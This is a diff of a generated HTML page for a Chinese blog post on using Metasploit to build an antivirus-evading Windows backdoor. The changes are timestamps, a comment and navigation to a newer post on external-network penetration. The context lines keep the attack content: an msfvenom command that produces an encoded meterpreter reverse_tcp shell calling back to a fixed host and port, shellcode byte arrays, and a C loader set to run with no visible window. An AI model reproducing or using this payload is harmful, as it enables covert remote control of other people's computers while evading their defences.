@@ -23,7 +23,7 @@
 <meta property="og:image" content="http://yoursite.com/2019/02/01/利用metasploit生成免杀后门/99.PNG">
 <meta property="og:image" content="http://yoursite.com/2019/02/01/利用metasploit生成免杀后门/000.PNG">
 <meta property="og:image" content="http://yoursite.com/2019/02/01/利用metasploit生成免杀后门/dd.PNG">
-<meta property="og:updated_time" content="2019-02-02T04:34:06.469Z">
+<meta property="og:updated_time" content="2019-02-02T05:01:40.417Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="利用metasploit生成免杀后门">
 <meta name="twitter:description" content="①在kali中生成shellcode免杀 msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b ‘\x00’ lhost=192.168.0.124 lport=5555 -f c -o /home/test.c  注：-e：指定编码方式；-i：指定编码次数；-b：去除指定代码，一般是空代码或者是错误代">
@@ -137,7 +137,7 @@
 &quot;\x3b\x12\x14\x15\xc5\x81\x2d\xf5\x54\x26\x9b\xa0\xb8\x55\x7e&quot;
 &quot;\x9a\xd1\xbe\xb7\x85\x8c\xa4\xce\xde\xf3\x7a&quot;;</code></p>
 <p>手动添加一些代码：</p>
-<p><code>#include&lt;stdio.h&gt;</code><br><code>#include&lt;windows.h&gt;</code><br><code>#pragma comment( linker, &quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;)</code></p>
+<p><code>#include&lt;stdio.h&gt;</code><br><code>#include&lt;windows.h&gt;</code><br><code>#pragma comment( linker, &quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;)</code>  <!--运行时不显示窗口--></p>
 <p><code>unsigned char buf[] = 
 &quot;\xb8\x3b\xc1\xbf\x73\xda\xdb\xd9\x74\x24\xf4\x5a\x29\xc9\xb1&quot;
 &quot;\x71\x31\x42\x13\x03\x42\x13\x83\xc2\x3f\x23\x4a\xcd\x8f\xfb&quot;
@@ -238,13 +238,27 @@ __asm
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/02/01/利用metasploit生成免杀后门/" data-id="cjrmzguqo0000l4v6405awjuw" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/02/01/利用metasploit生成免杀后门/" data-id="cjs1tjvx30001uov6vdrmbyvi" class="article-share-link">Share</a>
       
       
     </footer>
   </div>
   
     
+<nav id="article-nav">
+  
+    <a href="/2019/02/12/ssh-vps实现外网渗透/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          ssh+vps实现外网渗透
+        
+      </div>
+    </a>
+  
+  
+</nav>
+
   
 </article>
 
@@ -275,6 +289,10 @@ __asm
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2019/02/12/ssh-vps实现外网渗透/">ssh+vps实现外网渗透</a>
+          </li>
         
           <li>
             <a href="/2019/02/01/利用metasploit生成免杀后门/">利用metasploit生成免杀后门</a>
